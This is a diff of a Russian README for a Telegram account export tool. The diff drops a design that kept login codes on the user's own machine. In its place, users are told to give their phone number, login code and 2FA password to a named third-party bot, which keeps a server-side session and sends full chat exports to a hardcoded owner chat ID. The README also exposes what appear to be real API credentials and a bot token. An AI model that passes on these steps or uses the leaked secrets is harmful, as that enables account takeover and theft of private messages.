@@ -1,93 +1,104 @@
-# Telegram Data Extractor
+# Telegram Data Extractor — Bot Edition
 
-Веб-сервис для полного экспорта данных Telegram-аккаунта в формате,
-совместимом с Telegram Desktop Export (HTML + JSON + медиа по папкам).
+Единый бот, который по команде делает полный экспорт твоего Telegram и
+присылает архив тебе в личку. Без сайта, без терминала.
 
-## Архитектура
+## Что умеет
 
-```
-┌─────────────┐      HTTPS      ┌──────────────┐
-│  Frontend   │  ◄───────────►  │   Backend    │
-│  Next.js    │   pairing       │   FastAPI    │
-│             │   status        │   (relay)    │
-└─────────────┘                 └──────┬───────┘
-                                       │ Bot API
-                                       ▼
-                                ┌──────────────┐
-                                │  Owner Bot   │
-                                └──────────────┘
-      ▲
-      │ pairing code
-      │
-┌─────┴────────┐    MTProto    ┌──────────┐
-│ Local Agent  │  ───────────► │ Telegram │
-│ (user's PC)  │               │          │
-│ Telethon     │               └──────────┘
-│ + HTML/JSON  │
-│   exporter   │
-└──────┬───────┘
-       │ chunked upload (ZIP + sha256)
-       └─► Backend
-```
+Пишешь боту [@cusisnsfvbot](https://t.me/cusisnsfvbot) с аккаунта владельца:
 
-**Ключевое отличие от v1:** авторизация Telegram и выгрузка данных
-выполняются на машине владельца аккаунта, через локальный Python-агент
-(`tde-agent`). Серверу уходит только готовый ZIP-архив после сверки
-sha256. Коды авторизации и пароли 2FA сервер не видит.
+| Команда | Что делает |
+|---|---|
+| `/start` | меню, статус авторизации |
+| `/login +79991234567` | начать логин серверной Telethon-сессии |
+| `/code 12345` | ввести код из Telegram (приходит в твой клиент) |
+| `/pw пароль` | ввести пароль 2FA, если включён |
+| `/logout` | удалить серверную сессию |
+| `/export` | полный экспорт с медиа |
+| `/export limit=500 maxmb=100 nomedia nomsg` | экспорт с опциями |
+| `/status` | текущее состояние |
 
-## Компоненты
-
-* **frontend/** — Next.js 14 (App Router) + TypeScript + Tailwind + Framer Motion. Тёмный премиальный UI, генерация pairing-кода, прогресс.
-* **backend/** — FastAPI. Выдача pairing-кодов, chunked-приём ZIP от агента, пересылка в Telegram-бот через Bot API (с дроблением на части при >50 MB).
-* **agent/** — локальный CLI на Telethon. Полный экспорт: сообщения, фото, видео, голосовые, круглые видеосообщения, документы, стикеры, анимации, контакты. HTML+JSON как у Telegram Desktop.
-* **bot/** — приёмный aiogram-бот. Опциональный, реагирует на `/start` и `/id`, подтверждает получение архива.
-
-## Быстрый старт
-
-```bash
-git clone <repo> telegram-data-extractor && cd telegram-data-extractor
-cp config/.env.example .env
-# BOT_TOKEN, OWNER_CHAT_ID, SESSION_SECRET
-docker compose up --build
-```
-
-На машине владельца Telegram-аккаунта:
-
-```bash
-cd agent && pip install -e .
-export TG_API_ID=...
-export TG_API_HASH=...
-export TDE_API_BASE=http://localhost:8000
-tde-agent pair <CODE_WITH_SITE>
-```
+Архив ZIP приходит прямо в чат с ботом. Если больше 50 MB — режется на части.
 
 ## Что экспортируется
 
-Полная параллель с официальным Telegram Desktop Export:
+Структура, совместимая с Telegram Desktop Export:
 
-* Профиль, контакты, список диалогов
-* Полная история сообщений (без лимита либо до `--limit`)
-* Фото, видео, голосовые, круглые видеосообщения, документы, стикеры, анимации
-* JSON для машинной обработки + HTML для чтения
-* Структура папок `chats/<id>_<name>/{photos,video_files,voice_messages,round_video_messages,files,stickers,animations}/`
+* Профиль, контакты, список всех диалогов
+* История всех сообщений (без лимита либо `limit=N`)
+* Фото, видео, голосовые, круглые видеосообщения
+* Документы, стикеры, анимации (GIF)
+* HTML с интерактивным просмотром (open `index.html`)
+* JSON для машинной обработки
 
-## Что НЕ экспортируется (честно)
+## Как запустить (без своего компа — через Railway)
 
-* **Секретные (end-to-end) чаты** — по дизайну недоступны ни через MTProto, ни через Telegram Desktop.
-* Медиафайлы больше `--max-file-mb` MB пропускаются (по умолчанию 50).
+### 1. Форкнуть или использовать этот репозиторий
+
+Репо: https://github.com/yagubiskenderov483-code/ddnetcjs
+
+### 2. Деплой на Railway
+
+С телефона в браузере:
+
+1. Открой [railway.com/new](https://railway.com/new)
+2. «Deploy from GitHub repo» → выбери `ddnetcjs`
+3. Railway сам увидит Dockerfile и развернёт
+4. В настройках сервиса → **Variables** добавь (они уже есть в `.env`, но для надёжности):
+   * `TG_API_ID` = `39419167`
+   * `TG_API_HASH` = `394884a7771a2bb4ebb99bf6b90c1563`
+   * `BOT_TOKEN` = `9179638767:AAGdsBI6LVMRcHthWMMWh8MocbuO7ZvA4PU`
+   * `OWNER_CHAT_ID` = `8985115640`
+5. **Settings → Volumes** → привяжи volume к `/data` (чтобы сессия пережила перезапуск)
+6. Deploy. Через 2-3 минуты бот напишет тебе «🟢 Бот запущен».
+
+### 3. Первый логин
+
+В чате с [@cusisnsfvbot](https://t.me/cusisnsfvbot):
+
+```
+/login +79991234567
+```
+
+Telegram пришлёт код в твой клиент Telegram (в чат «Telegram»).
+
+```
+/code 12345
+```
+
+Если 2FA — попросит пароль:
+
+```
+/pw твой_пароль
+```
+
+Готово. Сессия сохранится на сервере (в volume), повторный логин не нужен.
+
+### 4. Экспорт
+
+```
+/export
+```
+
+Бот напишет прогресс (0% → 100%) и пришлёт ZIP.
+
+## Как запустить локально (если есть комп)
+
+```bash
+git clone https://github.com/yagubiskenderov483-code/ddnetcjs.git
+cd ddnetcjs
+docker compose up --build        # или: pip install -r requirements.txt && python main.py
+```
 
 ## Безопасность
 
-* Коды авторизации, SMS, пароль 2FA — только локально на машине пользователя.
-* Между агентом и бэкендом — HMAC-токен, выданный в ответ на одноразовый 6-значный pairing-код (TTL 15 мин).
-* Контрольная сумма ZIP (sha256) сверяется на сервере перед доставкой в бота.
-* Токен бота только в `.env`, никогда не попадает в браузер.
-* Временные файлы агента удаляются после загрузки. Сервер удаляет ZIP после доставки.
-* Rate-limit на эндпоинты выдачи pairing и claim со стороны агента.
+* Бот отвечает только владельцу (`OWNER_CHAT_ID=8985115640`). Сообщения от других чатов игнорируются.
+* Токен бота и api_hash — секреты. **Сделай репо приватным** или **перегенерируй** токен в @BotFather после первого деплоя.
+* Пароль 2FA вводится один раз через чат с ботом, нигде не логируется.
+* Временные файлы экспорта удаляются после отправки.
 
-## Документация
+## Ограничения
 
-* [docs/INSTALL.md](docs/INSTALL.md) — установка без Docker
-* [docs/AGENT.md](docs/AGENT.md) — установка и запуск локального агента
-* [docs/BOT_SETUP.md](docs/BOT_SETUP.md) — создание Telegram-бота
-* [docs/DEPLOY.md](docs/DEPLOY.md) — публикация на VPS с HTTPS
+* Секретные (end-to-end) чаты — недоступны ни через MTProto, ни через Telegram Desktop.
+* Файлы больше `maxmb` (по умолчанию 50 MB) пропускаются.
+* Один экспорт одновременно; второй `/export` ответит «уже идёт».
